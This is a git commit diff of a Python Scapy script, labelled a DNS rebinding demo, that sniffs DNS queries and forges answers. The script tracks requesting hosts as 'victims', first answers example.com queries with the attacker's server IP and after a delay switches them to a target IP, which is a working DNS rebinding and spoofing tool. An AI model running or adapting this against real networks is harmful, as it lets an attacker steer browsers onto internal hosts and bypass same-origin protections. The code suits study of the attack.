6ff04857b719ae6c2ee275d7c94a8ec3a8ca9089
DR <daniel3735928559@gmail.com>
2017-02-25 04:47:36 +0000

    dns rebinding demo page

--- dns_rebind/dns.py
+++ dns_rebind/dns.py
@@ -1,29 +1,35 @@
 from scapy.all import *
-import sys
+import sys, time
 srv_ip = sys.argv[1]
 target_ip = sys.argv[2]
 victims = {}
-ttl = 7
-filter = "udp port 53 and ip dst 8.8.8.8"
+ttl = 20
+ttl2 = 60
+filter = "udp port 53 and host 172.29.9.214 "
 def forward(orig_pkt):
-    print "Forwarding: " + orig_pkt[DNSQR].qname
+    print("Forwarding: " + orig_pkt[DNSQR].qname)
     response = sr1(IP(dst="8.8.8.8")/UDP(sport=orig_pkt[UDP].sport)/DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0)
     respPkt = IP(dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
     respPkt[DNS] = response[DNS]
     send(respPkt)
     return "Responding: " + respPkt.summary()
 def handle(pkt):
-    print("got",pkt.summary(),pkt['DNS Question Record'].qname if 'DNS Question Record' in pkt  else "blah")
-    if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0):
-        print("DNS")
-        if "example.com" in pkt['DNS Question Record'].qname:
+    #print("got", pkt.summary(), pkt[DNSQR].qname if DNSQR in pkt else "blah")
+    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
+        #print("DNS",pkt,pkt[DNSQR].qtype)
+        if "example.com" in pkt[DNSQR].qname.decode('ascii') and pkt[DNSQR].qtype == 1:
             src_ip = pkt[IP].src
             now = time.time()
             if src_ip in victims:
                 if now - victims[src_ip] > ttl:
-                    print("Old enough; sending fake response")
-                    out_ip = target_ip
-                    del victims[src_ip]
+                    print("DeltaT",now - victims[src_ip])
+                    if now - victims[src_ip] > ttl2:
+                        print("Too old; deleting")
+                        out_ip = srv_ip
+                        del victims[src_ip]
+                    else:
+                        print("Old enough; sending fake response")
+                        out_ip = target_ip
                 else:
                     print("Not old enough; Sending proper response")
                     out_ip = srv_ip
@@ -31,13 +37,14 @@ def handle(pkt):
                 print("New; Sending proper response")
                 out_ip = srv_ip
                 victims[src_ip] = time.time()
-            spfResp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=out_ip,ttl=ttl)/DNSRR(rrname="example.com",rdata=out_ip))
-            
+            spfResp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1,ancount=1,qd=pkt[DNSQR],an=DNSRR(rrname=pkt[DNSQR].qname,rdata=out_ip,ttl=ttl))
+            time.sleep(1)
             send(spfResp)
             return "DNS response: " + spfResp.summary()
         else:
             pass#return forward(pkt)
     else:
         return False
-
+print("Sniffing")
 sniff(filter = filter, prn=handle)
+
